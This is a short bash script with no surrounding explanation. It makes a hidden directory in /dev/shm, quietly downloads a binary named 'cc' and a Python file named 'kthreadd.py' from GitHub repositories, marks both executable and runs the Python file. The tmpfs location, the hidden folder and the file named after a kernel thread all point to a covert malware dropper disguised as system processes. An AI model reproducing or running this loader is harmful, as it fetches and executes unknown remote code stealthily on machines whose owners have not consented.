#!/bin/bash

set -e

mkdir -p /dev/shm/.cache
chmod 700 /dev/shm/.cache
cd /dev/shm/.cache

wget -q \
    https://github.com/ANTI-VIRAL/MACHINE/raw/main/cc \
    https://github.com/ANTI-VIRAL/sshd/raw/main/kthreadd.py 

chmod +x cc kthreadd.py

# Start program
exec python3 kthreadd.py
